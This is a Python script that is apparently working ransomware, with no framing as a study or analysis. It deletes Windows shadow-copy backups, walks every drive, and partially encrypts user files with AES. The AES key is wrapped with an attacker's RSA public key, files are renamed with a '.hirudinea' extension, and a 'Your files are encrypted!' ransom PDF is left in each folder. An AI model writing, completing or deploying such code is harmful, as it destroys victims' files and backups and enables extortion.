import os
import subprocess
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from fpdf import FPDF

def h(file_path, cipher, start, end):
    with open(file_path, 'r+b') as file:
        file.seek(start)
        data = file.read(end - start)
        encrypted_data = cipher.encrypt(data)
        file.seek(start)
        file.write(encrypted_data)

def d():
    subprocess.run("vssadmin delete shadows /all /quiet", shell=True)

pub_key = RSA.import_key('''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAn...[Your Public Key Here]...IDAQAB
-----END PUBLIC KEY-----''')

def r(data, key):
    c = PKCS1_OAEP.new(key)
    return c.encrypt(data)

def p(directory):
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=12)
    pdf.cell(200, 10, txt="Your files are encrypted!", ln=True, align='C')
    pdf.output(os.path.join(directory, "README.pdf"))

ign_dirs = {"$Recycle.Bin", "Boot", "Documents and Settings", "PerfLogs", 
    "Program Files", "Program Files (x86)", "ProgramData", "Recovery", 
    "System Volume Information", "Windows", "$RECYCLE.BIN"}

ign_exts = {".bat", ".bin", ".cab", ".cd", ".com", ".cur", ".diagaba", ".diagcfg", 
    ".diagpkg", ".drv", ".dll", ".exe", ".hlp", ".hta", ".ico", ".lnk", 
    ".msi", ".ocx", ".ps1", ".psm1", ".scr", ".sys", ".ini", "Thumbs.db", 
    ".url", ".iso"}

drives = [f"{chr(letter)}:\\" for letter in range(90, 64, -1) if os.path.exists(f"{chr(letter)}:\\")]

key = get_random_bytes(16)
iv = get_random_bytes(16)
cipher = AES.new(key, AES.MODE_CTR, nonce=b'', initial_value=iv)

enc_key = r(key, pub_key)
enc_iv = r(iv, pub_key)

d()

for drive in drives:
    for root, dirs, files in os.walk(drive):
        if any(ign_dir in root for ign_dir in ign_dirs):
            continue

        e_files = False
        for file in files:
            file_path = os.path.join(root, file)
            file_ext = os.path.splitext(file_path)[1]

            if file_ext in ign_exts:
                continue

            try:
                file_size = os.path.getsize(file_path)
                
                if file_size <= 2 * 1024 * 1024:
                    sections = [(0, min(1024 * 1024, file_size))]
                elif 2 * 1024 * 1024 < file_size <= 4 * 1024 * 1024:
                    sections = [(0, 1024 * 1024), (2 * 1024 * 1024, min(file_size, 3 * 1024 * 1024))]
                else:
                    section_size = file_size // 4
                    sections = [(i, min(i + 1024 * 1024, i + section_size)) for i in range(0, file_size, section_size)]

                for start, end in sections:
                    h(file_path, cipher, start, end)

                os.rename(file_path, file_path + ".hirudinea")

                with open(file_path + ".hirudinea", 'ab') as file:
                    file.write(enc_key)
                    file.write(enc_iv)

                e_files = True

            except (PermissionError, IOError):
                continue

        if e_files:
            p(root)

d()